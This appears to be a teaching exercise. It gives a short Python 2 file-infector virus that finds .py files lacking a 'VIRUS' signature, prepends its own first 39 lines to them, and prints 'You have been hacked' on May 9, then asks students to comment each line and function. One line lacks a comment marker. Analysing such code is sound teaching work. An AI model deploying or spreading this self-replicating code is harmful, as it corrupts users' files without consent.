#!/usr/bin/python
# Load Python and import the OS and DATETIME Libraries
import os
import datetime

# Define a variable named SIGNATURE and set it to VIRUS
SIGNATURE = "VIRUS"

Define a function
def locate(path):
    files_targeted = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted

def infect(files_targeted):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print "You have been hacked"

files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()
Perform an analysis of the Python-based code.

Insert comments into each line of the script explaining in your own words what the virus is doing on this line.
Insert comments above each function explaining what the purpose of this function is and what it hopes to carry out.
Insert comments above the final three lines explaining how the functions are called and what this script appears to do.
